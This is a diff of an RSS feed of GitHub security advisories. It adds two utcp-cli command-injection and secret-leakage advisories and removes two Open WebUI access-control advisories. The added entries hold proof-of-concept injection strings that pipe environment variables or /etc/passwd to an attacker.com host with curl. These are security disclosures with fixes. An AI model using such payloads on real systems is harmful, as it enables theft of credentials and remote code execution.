@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-05-14T20:47:06.427Z</updated>
+    <updated>2026-05-14T21:54:32.075Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,119 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[utcp-cli] python-utcp: Full Process Environment Exposed to CLI Subprocess - Secrets Leakage via Command Injection]]></title>
+        <id>https://github.com/advisories/GHSA-5v57-8rxj-3p2r</id>
+        <link href="https://github.com/advisories/GHSA-5v57-8rxj-3p2r"/>
+        <updated>2026-05-14T20:56:08.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>_prepare_environment()</code> in <code>cli_communication_protocol.py</code> passes a full copy of <code>os.environ</code> to every CLI subprocess. When combined with the Command Injection vulnerability (CWE-78) in <code>_substitute_utcp_args()</code> tracked as GHSA-33p6-5jxp-p3x4, an attacker can exfiltrate all process-level secrets in a single tool call.</p>
+<h2 id="vulnerable-code">Vulnerable Code</h2>
+<pre><code class="language-python"># cli_communication_protocol.py
+def _prepare_environment(self, provider: CliCallTemplate) -&gt; Dict[str, str]:
+    env = os.environ.copy()        # All secrets inherited
+    if provider.env_vars:
+        env.update(provider.env_vars)
+    return env
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>Any environment variable present in the host process is accessible to injected commands. In typical AI agent deployments this includes:</p>
+<ul>
+<li>Cloud provider credentials (AWS_SECRET_ACCESS_KEY, AZURE_CLIENT_SECRET)</li>
+<li>Database connection strings (DATABASE_URL)</li>
+<li>LLM API keys (OPENAI_API_KEY, ANTHROPIC_API_KEY)</li>
+<li>Internal service tokens</li>
+</ul>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<pre><code class="language-python"># Tool defined as:
+{"command": "grep UTCP_ARG_pattern_UTCP_END logfile.txt"}
+
+# Attacker supplies:
+tool_args = {"pattern": "x; env | curl -s -d @- https://attacker.com"}
+
+# Executed bash script:
+# CMD_0_OUTPUT=$(grep x; env | curl -s -d @- https://attacker.com 2&gt;&amp;1)
+# -&gt; Full env dump sent to attacker including all secrets
+</code></pre>
+<h2 id="patched">Patched</h2>
+<p>Fixed in <code>utcp-cli</code> 1.1.2. <code>_prepare_environment</code> no longer copies the full host environment. Inheritance is controlled by a new <code>CliCallTemplate.inherit_env_vars</code> field:</p>
+<ul>
+<li><code>null</code> (default): a small built-in OS-specific allowlist (<code>PATH</code>, <code>HOME</code>, <code>LANG</code> on Unix; <code>PATH</code>, <code>PATHEXT</code>, <code>SYSTEMROOT</code>, <code>USERPROFILE</code>, etc. on Windows) is inherited so shells and binaries continue to work.</li>
+<li><code>[]</code>: strict mode -- nothing from the host environment reaches the subprocess; only <code>env_vars</code> is propagated.</li>
+<li><code>["FOO", "BAR"]</code>: exactly those host variables are inherited (replaces, not merges with, the default allowlist).</li>
+</ul>
+<p><code>env_vars</code> is always layered on top and overrides any inherited value. Secrets like <code>OPENAI_API_KEY</code> no longer reach the subprocess unless the call template explicitly opts them in.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Upgrade to <code>utcp-cli &gt;= 1.1.2</code>. There is no workaround in earlier versions short of stripping secrets from the host process before any CLI tool call.</p>
+<h2 id="credit">Credit</h2>
+<p>Reported by @ZeroXJacks.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/universal-tool-calling-protocol/python-utcp/security/advisories/GHSA-5v57-8rxj-3p2r">https://github.com/universal-tool-calling-protocol/python-utcp/security/advisories/GHSA-5v57-8rxj-3p2r</a></li>
+<li><a href="https://github.com/advisories/GHSA-5v57-8rxj-3p2r">https://github.com/advisories/GHSA-5v57-8rxj-3p2r</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5v57-8rxj-3p2r</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-14T20:56:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[utcp-cli] utcp-cli Vulnerable to Command Injection via Unsanitized Argument Substitution in CLI Communication Protocol]]></title>
+        <id>https://github.com/advisories/GHSA-33p6-5jxp-p3x4</id>
+        <link href="https://github.com/advisories/GHSA-33p6-5jxp-p3x4"/>
+        <updated>2026-05-14T20:56:03.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>_substitute_utcp_args</code> method in <code>cli_communication_protocol.py</code> inserts user-controlled <code>tool_args</code> values directly into shell command strings without any sanitization or escaping. These commands are then executed via <code>/bin/bash -c</code> (Unix) or <code>powershell.exe -Command</code> (Windows), allowing an attacker to inject arbitrary shell commands.</p>
+<h2 id="affected-file">Affected File</h2>
+<p><code>plugins/communication_protocols/cli/src/utcp_cli/cli_communication_protocol.py</code></p>
+<h2 id="vulnerable-code">Vulnerable Code</h2>
+<pre><code class="language-python">def replace_placeholder(match):
+    arg_name = match.group(1)
+    if arg_name in tool_args:
+        return str(tool_args[arg_name])  # No escaping applied
+</code></pre>
+<p>The substituted command is then embedded directly into a shell script:</p>
+<pre><code class="language-python">script_lines.append(f'{var_name}=$({substituted_command} 2&gt;&amp;1)')
+</code></pre>
+<p>And executed via:</p>
+<pre><code class="language-python">shell_cmd = ['/bin/bash', '-c', script]
+</code></pre>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Given a tool defined as:</p>
+<pre><code class="language-json">{"command": "python script.py --input UTCP_ARG_filename_UTCP_END"}
+</code></pre>
+<p>Calling with:</p>
+<pre><code class="language-python">tool_args = {"filename": "data.csv; curl http://attacker.com/$(cat /etc/passwd | base64)"}
+</code></pre>
+<p>Produces and executes:</p>
+<pre><code class="language-bash">CMD_0_OUTPUT=$(python script.py --input data.csv; curl http://attacker.com/$(cat /etc/passwd | base64) 2&gt;&amp;1)
+</code></pre>
+<p>This results in full Remote Code Execution on the host system.</p>
+<h2 id="patched">Patched</h2>
+<p>Fixed in <code>utcp-cli</code> 1.1.2. <code>_substitute_utcp_args</code> now shell-quotes every substituted value: <code>shlex.quote</code> on Unix, a PowerShell single-quoted literal on Windows. Each <code>UTCP_ARG_..._UTCP_END</code> placeholder therefore expands to exactly one shell token, blocking metacharacter injection (<code>;</code>, <code>|</code>, <code>&amp;</code>, backticks, <code>$()</code>, newlines).</p>
+<p><strong>Behavior change:</strong> tools that relied on a single placeholder splitting into multiple shell tokens (e.g. <code>UTCP_ARG_flags_UTCP_END</code> -&gt; <code>--verbose --debug</code>) must now use one placeholder per intended argument.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Upgrade to <code>utcp-cli &gt;= 1.1.2</code>. There is no workaround in earlier versions short of refusing all attacker-controlled <code>tool_args</code>.</p>
+<h2 id="credit">Credit</h2>
+<p>Reported by @ZeroXJacks.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/universal-tool-calling-protocol/python-utcp/security/advisories/GHSA-33p6-5jxp-p3x4">https://github.com/universal-tool-calling-protocol/python-utcp/security/advisories/GHSA-33p6-5jxp-p3x4</a></li>
+<li><a href="https://github.com/advisories/GHSA-33p6-5jxp-p3x4">https://github.com/advisories/GHSA-33p6-5jxp-p3x4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-33p6-5jxp-p3x4</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-05-14T20:56:01.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[open-webui] Open WebUI: LDAP and OAuth First-User Race Condition Allows Multiple Admin Accounts]]></title>
         <id>https://github.com/advisories/GHSA-h3ww-q6xx-w7x3</id>
@@ -2237,105 +2350,5 @@ Discover LLM System Information: System Prompt - <a href="https://atlas.mitre.or
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-05-14T20:25:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[open-webui] Open WebUI's chat completion API allows tool restrictions to be bypassed]]></title>
-        <id>https://github.com/advisories/GHSA-4pcg-253r-rf9w</id>
-        <link href="https://github.com/advisories/GHSA-4pcg-253r-rf9w"/>
-        <updated>2026-05-14T20:24:52.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Open WebUI v0.6.43 contains a vulnerability in its chat completion API, which allows attackers to bypass tool restrictions, potentially enabling unauthorized actions or access.</p>
-<h3 id="details">Details</h3>
-<p>In the <a href="https://github.com/open-webui/open-webui/blob/a7271532f8a38da46785afcaa7e65f9a45e7d753/backend/open_webui/main.py#L1529">chat_completion</a> API, the parameters <a href="https://github.com/open-webui/open-webui/blob/a7271532f8a38da46785afcaa7e65f9a45e7d753/backend/open_webui/main.py#L1613-L1614">tool_ids and tool_servers</a> are supplied by the user. These parameters are used to <a href="https://github.com/open-webui/open-webui/blob/a7271532f8a38da46785afcaa7e65f9a45e7d753/backend/open_webui/utils/middleware.py#L1394">create a tools_dict by the middleware</a>. This is then used by <a href="https://github.com/open-webui/open-webui/blob/a7271532f8a38da46785afcaa7e65f9a45e7d753/backend/open_webui/models/tools.py#L139">get_tool_by_id</a> to retrieve the appropriate tool. However, there is no checks in that ensures the user that uses the API has permission to use the tool, meaning that a user can invoke any server tool by supplying the correct tool_id or tool_servers parameters via the chat completion API. Moreover, the authentication token stored in the server would be used when invoking the tool, so the tool will be invoked with the server privilege.</p>
-<h3 id="poc">PoC</h3>
-<p>To reproduce the issue, create an admin user and create an external tool via the admin settings. Set the type to "MCP Streamable HTTP" for the tool, and the url pointing to a mcp server. For example, the public instance of the <a href="https://github.com/modelcontextprotocol/servers/blob/main/src/fetch/README.md">"Fetch" mcp server</a> can be used, which is located at "<a href="https://remote.mcpservers.org/fetch/mcp">https://remote.mcpservers.org/fetch/mcp</a>". Other mcp servers, e.g. the GitHub MCP server can also be used. Then set the "Auth" field appropriately. (Fetch mcp does not require Auth to be set).</p>
-<p>Set the ID, name and description for the MCP server and set visibility to private. This should prevent any user from using the mcp server. (For the example below, we use the fetch mcp server and set the ID to 1)</p>
-<p>Next create a user with low privilege and enable API keys from the admin settings.</p>
-<p>Then use the chat completion API with the low privilege user with a prompt specifying the use of the restricted tool, and include the id of the tool in the tool_ids parameter. For example, to use the fetch mcp server set up before:</p>
-<pre><code>def chat_with_model(token):
-    url = 'http://localhost:3000/api/chat/completions'
-    headers = {
-        'Authorization': f'Bearer {token}',
-        'Content-Type': 'application/json'
-    }
-    data = {
-      "model": "llama3.1:latest",
-      "messages": [
-        {
-          "role": "user",
-          "content": "Use the fetch tool to fetch content of the url https://raw.githubusercontent.com/modelcontextprotocol/servers/refs/heads/main/src/fetch/LICENSE"
-        }],
-        
-        "tool_ids" : [
-            "server:mcp:1",
-        ],
-    }
-    response = requests.post(url, headers=headers, json=data)
-    return response.json()
-</code></pre>
-<p>Note that the tool will be used to fetch the content of the file, despite the tool is restricted and has it's visibility set to private</p>
-<h3 id="impact">Impact</h3>
-<p>This issue may lead to restricted tools being invoked by users via the chat completion API</p>
-<h2 id="resolution">Resolution</h2>
-<p>Fixed across two releases</p>
-<ul>
-<li><p><strong>Local Tool records</strong> (<code>tool_ids: ["&lt;tool_id&gt;"]</code> referencing a stored Tool): fixed in commit <a href="https://github.com/open-webui/open-webui/commit/9b06fdc8fe1c933071610336be05f11e77e6c8eb">9b06fdc8f</a>, first released in <strong>v0.7.0</strong>. <code>get_tools()</code> in <code>backend/open_webui/utils/tools.py</code> (line 166) now resolves the caller's group memberships and rejects each requested <code>tool_id</code> whose owner isn't the caller and for which no <code>AccessGrants.has_access(resource_type='tool', permission='read')</code> grant exists. Admins continue to bypass when <code>BYPASS_ADMIN_ACCESS_CONTROL</code> is enabled (its documented UI/posture purpose).</p>
-</li>
-<li><p><strong>Admin-configured MCP servers</strong> (<code>tool_ids: ["server:mcp:&lt;id&gt;"]</code>, the report's exact PoC): fixed in commit <a href="https://github.com/open-webui/open-webui/commit/4737e1f11">4737e1f11</a>, first released in <strong>v0.8.6</strong>. The MCP-resolution loop in <code>backend/open_webui/utils/middleware.py</code> (line 2670) now calls <code>has_connection_access(user, mcp_server_connection)</code> and skips the server with a warning if the user has no grant — the server's stored credentials are never used on behalf of an unauthorized caller.</p>
-</li>
-</ul>
-<p>Users on <code>&gt;= 0.8.6</code> are not affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-4pcg-253r-rf9w">https://github.com/open-webui/open-webui/security/advisories/GHSA-4pcg-253r-rf9w</a></li>
-<li><a href="https://github.com/open-webui/open-webui/commit/4737e1f11">https://github.com/open-webui/open-webui/commit/4737e1f11</a></li>
-<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.8.6">https://github.com/open-webui/open-webui/releases/tag/v0.8.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-4pcg-253r-rf9w">https://github.com/advisories/GHSA-4pcg-253r-rf9w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4pcg-253r-rf9w</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-14T20:24:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[open-webui] Open WebUI has Broken Access Control for Completions API]]></title>
-        <id>https://github.com/advisories/GHSA-gfm2-xm6c-37qc</id>
-        <link href="https://github.com/advisories/GHSA-gfm2-xm6c-37qc"/>
-        <updated>2026-05-14T20:24:37.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Any user <code>X</code> can continue the conversation of any other user <code>Y</code>, as long as the Chat ID of <code>Y</code> is known. User <code>X</code> does not even need to be an admin to do so. </p>
-<h3 id="details">Details</h3>
-<p>A user just needs to use the API endpoint: <code>/api/chat/completions</code> with their own API key (generated in OWUI) and the Chat ID of another user. <strong>OWUI does not check to match the Chat ID with the user that created that Chat ID</strong>. Note that both users will need access to the same model. This is especially relevant if there is a shared pipeline model between users. </p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Using OWUI v0.6.18</li>
-<li>Sign in with any user <code>X</code></li>
-<li>Generate an API Key for user <code>X</code> using the settings</li>
-<li>Create another user <code>Y</code>, and have a conversation in OWUI. Copy the Chat ID from the URL.</li>
-<li>User <code>X</code> can now use the API <code>/api/chat/completions</code> and the Chat ID from step 4 to continue the conversation of user <code>Y</code></li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>Large impact to any user in OWUI. People can read your conversations, and access private information if they know your Chat ID (which is in the URL of the chat). </p>
-<h2 id="resolution">Resolution</h2>
-<p>Fixed in commit <a href="https://github.com/open-webui/open-webui/commit/cf4218e688def6f11d195aeda6665ae5b5376b67">cf4218e68</a>, first released in <strong>v0.9.0</strong> (Apr 2026). The <code>chat_completion</code> handler at <code>backend/open_webui/main.py:1868</code> now explicitly verifies chat ownership via <code>Chats.is_chat_owner(chat_id, user.id)</code> for any request that targets an existing chat, and raises 404 for non-owners (admin bypass preserved per the documented threat model). New chats (no <code>chat_id</code> supplied, or freshly inserted via the <code>is_new_chat</code> branch) are unaffected. Users on <code>&gt;= 0.9.0</code> are not affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-gfm2-xm6c-37qc">https://github.com/open-webui/open-webui/security/advisories/GHSA-gfm2-xm6c-37qc</a></li>
-<li><a href="https://github.com/open-webui/open-webui/commit/cf4218e688def6f11d195aeda6665ae5b5376b67">https://github.com/open-webui/open-webui/commit/cf4218e688def6f11d195aeda6665ae5b5376b67</a></li>
-<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.9.0">https://github.com/open-webui/open-webui/releases/tag/v0.9.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-gfm2-xm6c-37qc">https://github.com/advisories/GHSA-gfm2-xm6c-37qc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gfm2-xm6c-37qc</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-14T20:24:35.000Z</published>
     </entry>
 </feed>
